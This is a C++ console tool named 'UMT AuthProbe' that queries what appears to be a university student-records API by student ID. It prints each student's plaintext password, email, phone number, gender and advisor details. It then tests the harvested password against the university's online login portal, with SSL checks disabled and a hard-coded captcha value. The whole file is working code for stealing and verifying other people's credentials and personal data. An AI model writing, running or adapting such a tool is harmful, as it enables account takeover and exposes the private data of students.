#include <iostream>
#include <regex>
#include <sstream>
#include <cstdlib>
#include <cpr/cpr.h>
#include <fmt/color.h>
#include <fstream>
#include <unordered_map>
#include <tinyxml2.h>

std::unordered_map<std::string, std::string> loadEnv(const std::string &filepath)
{
    std::unordered_map<std::string, std::string> envMap;
    std::ifstream file(filepath);
    if (!file.is_open())
    {
        std::cerr << "Failed to open .env file.\n";
        return envMap;
    }

    std::string line;
    while (std::getline(file, line))
    {
        if (line.empty() || line[0] == '#')
            continue;

        size_t delimiterPos = line.find('=');
        if (delimiterPos == std::string::npos)
            continue;

        std::string key = line.substr(0, delimiterPos);
        std::string value = line.substr(delimiterPos + 1);

        key.erase(0, key.find_first_not_of(" \t\n\r"));
        key.erase(key.find_last_not_of(" \t\n\r") + 1);
        value.erase(0, value.find_first_not_of(" \t\n\r"));
        value.erase(value.find_last_not_of(" \t\n\r") + 1);

        envMap[key] = value;
    }

    return envMap;
}

int main()
{
    // PATH HERE
    auto env = loadEnv("[PATH]");
    
    std::string url = env["UMT_URL"];
    std::string auth = env["UMT_AUTH"];
    std::string username = env["UMT_USERNAME"];
    std::string password = env["UMT_PASSWORD"];

    int option = 0;
    std::string input;
    bool programRunning = true;
    std::regex idPattern("^[sfSF]\\d{9,11}$");

    while (programRunning)
    {
        std::string pause;
        std::string studentID = "";
        std::system("cls");

        fmt::print("{}{}\n\n",
                   fmt::styled("UMT", fmt::fg(fmt::color::cornflower_blue) | fmt::emphasis::bold | fmt::emphasis::underline),
                   fmt::styled("AuthProbe", fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold | fmt::emphasis::underline));

        fmt::print("{}\n{}\n\n",
                   fmt::styled("1. Get Credentials", fmt::fg(fmt::color::light_green) | fmt::emphasis::bold),
                   fmt::styled("2. Exit", fmt::fg(fmt::color::light_coral) | fmt::emphasis::bold));

        std::getline(std::cin, input);
        std::stringstream ss(input);

        if ((ss >> option) && !(ss >> input) && (option == 1 || option == 2))
        {
            if (option == 1)
            {
                std::system("cls");
                fmt::print("{}", fmt::styled("Enter Student ID: ", fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                std::getline(std::cin, studentID);

                if (std::regex_match(studentID, idPattern))
                {
                    cpr::Response response = cpr::Get(cpr::Url{url}, cpr::Parameters{{"auth", auth}, {"p_UserName", username}, {"p_Password", password}, {"studentid", studentID}});
                    if (response.status_code != 200)
                    {
                        fmt::print("{}", fmt::styled("\nAn error occured with your request!", fmt::fg(fmt::color::indian_red) | fmt::emphasis::bold | fmt::emphasis::underline));
                        fmt::print("{}", fmt::styled("\n\nPress any key to continue...", fmt::fg(fmt::color::honey_dew) | fmt::emphasis::italic));
                        std::getline(std::cin, pause);
                    }
                    else
                    {
                        tinyxml2::XMLDocument doc;
                        doc.Parse(response.text.c_str());

                        tinyxml2::XMLElement *root = doc.FirstChildElement("ArrayOfStudentData");
                        if (!root)
                        {
                            fmt::print("{}", fmt::styled("\nAn error occured while fetching response!", fmt::fg(fmt::color::indian_red) | fmt::emphasis::bold | fmt::emphasis::underline));
                            fmt::print("{}", fmt::styled("\n\nPress any key to continue...", fmt::fg(fmt::color::honey_dew) | fmt::emphasis::italic));
                            std::getline(std::cin, pause);
                        }

                        tinyxml2::XMLElement *student = root->FirstChildElement("StudentData");
                        if (!student)
                        {
                            fmt::print("{}", fmt::styled("\nInvalid Student ID!", fmt::fg(fmt::color::indian_red) | fmt::emphasis::bold | fmt::emphasis::underline));
                            fmt::print("{}", fmt::styled("\n\nPress any key to continue...", fmt::fg(fmt::color::honey_dew) | fmt::emphasis::italic));
                            std::getline(std::cin, pause);
                        }
                        else
                        {
                            auto getText = [](tinyxml2::XMLElement *parent, const char *tag) -> std::string
                            {
                                tinyxml2::XMLElement *elem = parent->FirstChildElement(tag);
                                return elem && elem->GetText() ? elem->GetText() : "";
                            };

                            std::string guid = getText(student, "student_guid");
                            std::string student_name = getText(student, "student_name");
                            std::string student_id = getText(student, "student_id");
                            std::string student_pass = getText(student, "student_pass");
                            std::string student_school = getText(student, "student_school");
                            std::string student_program = getText(student, "student_program");
                            std::string student_batch = getText(student, "student_batch");
                            std::string student_email = getText(student, "student_email");
                            std::string student_gender = getText(student, "student_gender");
                            std::string phone_number = getText(student, "student_phonenumber");
                            std::string status_reason = getText(student, "statusreason");
                            std::string block_reason = getText(student, "blockreason");
                            std::string advisor_name = getText(student, "student_advisor");
                            std::string advisor_email = getText(student, "advisor_Email");
                            std::string advisor_phone = getText(student, "advisor_phonenumber");

                            fmt::print("{} {}\n", fmt::styled("\nGUID: ", fmt::fg(fmt::color::light_gray)), fmt::styled(guid, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                            fmt::print("{} {}\n", fmt::styled("Student Name: ", fmt::fg(fmt::color::light_gray)), fmt::styled(student_name, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                            fmt::print("{} {}\n", fmt::styled("Student ID: ", fmt::fg(fmt::color::light_gray)), fmt::styled(student_id, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                            fmt::print("{} {}\n", fmt::styled("Student Password: ", fmt::fg(fmt::color::light_gray)), fmt::styled(student_pass, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                            fmt::print("{} {}\n", fmt::styled("School: ", fmt::fg(fmt::color::light_gray)), fmt::styled(student_school, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                            fmt::print("{} {}\n", fmt::styled("Program: ", fmt::fg(fmt::color::light_gray)), fmt::styled(student_program, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                            fmt::print("{} {}\n", fmt::styled("Batch: ", fmt::fg(fmt::color::light_gray)), fmt::styled(student_batch, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                            fmt::print("{} {}\n", fmt::styled("Email: ", fmt::fg(fmt::color::light_gray)), fmt::styled(student_email, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                            fmt::print("{} {}\n", fmt::styled("Gender: ", fmt::fg(fmt::color::light_gray)), fmt::styled(student_gender, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                            fmt::print("{} {}\n", fmt::styled("Phone Number: ", fmt::fg(fmt::color::light_gray)), fmt::styled(phone_number, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                            fmt::print("{} {}\n", fmt::styled("Status Reason: ", fmt::fg(fmt::color::light_gray)), fmt::styled(status_reason, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                            fmt::print("{} {}\n", fmt::styled("Block Reason: ", fmt::fg(fmt::color::light_gray)), fmt::styled(block_reason, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                            fmt::print("{} {}\n", fmt::styled("Advisor Name: ", fmt::fg(fmt::color::light_gray)), fmt::styled(advisor_name, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                            fmt::print("{} {}\n", fmt::styled("Advisor Email: ", fmt::fg(fmt::color::light_gray)), fmt::styled(advisor_email, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));
                            fmt::print("{} {}\n", fmt::styled("Advisor Phone: ", fmt::fg(fmt::color::light_gray)), fmt::styled(advisor_phone, fmt::fg(fmt::color::honey_dew) | fmt::emphasis::bold));

                            if (student_pass.length() > 3)
                            {
                                cpr::Response response2 = cpr::Post(
                                    cpr::Url{"https://online.umt.edu.pk/Account/Login"},
                                    cpr::Payload{{"student_id", studentID}, {"Password", student_pass}, {"SecurityCode", "abcde"}, {"SecurityCodeText", "abcde"}},
                                    cpr::VerifySsl(false),
                                    cpr::Header{{"User-Agent", "Mozilla/5.0"}},
                                    cpr::Timeout{3500});

                                if (response2.text.length() < 10)
                                {
                                    fmt::print("{}", fmt::styled("\nPASSWORD HIT ON PORTAL!\n", fmt::fg(fmt::color::sea_green) | fmt::emphasis::bold | fmt::emphasis::underline));
                                }
                                else
                                {
                                    fmt::print("{}", fmt::styled("\nPASSWORD FAILED ON PORTAL!\n", fmt::fg(fmt::color::red) | fmt::emphasis::bold | fmt::emphasis::strikethrough));
                                }
                            }
                            else
                            {
                                fmt::print("{}", fmt::styled("\nPASSWORD IS OBFUSCATED!\n", fmt::fg(fmt::color::orange) | fmt::emphasis::bold));
                            }
                            fmt::print("{}", fmt::styled("\nPress any key to continue...", fmt::fg(fmt::color::honey_dew) | fmt::emphasis::italic));
                            std::getline(std::cin, pause);
                        }
                    }
                }
                else
                {
                    fmt::print("{}", fmt::styled("\nInvalid Student ID!", fmt::fg(fmt::color::indian_red) | fmt::emphasis::bold | fmt::emphasis::underline));
                    fmt::print("{}", fmt::styled("\n\nPress any key to continue...", fmt::fg(fmt::color::honey_dew) | fmt::emphasis::italic));
                    std::getline(std::cin, pause);
                }
            }
            else
            {
                programRunning = false;
                fmt::print("{} {} {} {}",
                           fmt::styled("\nMade with", fmt::fg(fmt::color::light_gray) | fmt::emphasis::bold),
                           fmt::styled("Love", fmt::fg(fmt::color::hot_pink) | fmt::emphasis::bold),
                           fmt::styled("By", fmt::fg(fmt::color::light_gray) | fmt::emphasis::bold),
                           fmt::styled("Sunbreeze\n\n", fmt::fg(fmt::color::medium_purple) | fmt::emphasis::bold | fmt::emphasis::underline));
            }
        }
        else
        {
            fmt::print("{}", fmt::styled("\nInvalid Option!", fmt::fg(fmt::color::indian_red) | fmt::emphasis::bold | fmt::emphasis::underline));
            fmt::print("{}", fmt::styled("\n\nPress any key to continue...", fmt::fg(fmt::color::honey_dew) | fmt::emphasis::italic));
            std::getline(std::cin, pause);
        }
    }

    return 0;
}